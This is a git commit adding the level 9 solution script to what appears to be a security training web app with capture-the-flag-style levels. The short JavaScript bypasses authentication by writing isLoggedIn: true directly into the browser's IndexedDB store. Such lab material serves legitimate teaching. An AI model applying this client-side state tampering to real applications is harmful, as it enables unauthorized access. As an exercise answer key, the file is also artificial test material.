0ccb44a3b9d94721fa35c176f80f3503514b57e3
Joseph Dane <Joseph_Dane@symantec.com>
2019-08-28 17:35:05 -0400

    added level 8 and 9 and level 9 solution

---
+++ webapp/templates/level9_Solution.js
@@ -0,0 +1,15 @@
+var connection = indexedDB.open('level9', 1)
+
+connection.onsuccess = (e) => {
+  var database = e.target.result;
+  var transaction = database.transaction(["level9"], "readwrite");
+  var objectStore = transaction.objectStore("authentication");
+  var request = objectStore.put({id:"1", isLoggedIn: true});
+
+  request.onsuccess = (e) => {
+    console.log('Changed isLoggedIn')
+  }
+  request.onerror = (e) => {
+    console.log('Error changing isLoggedIn')
+  }
+}
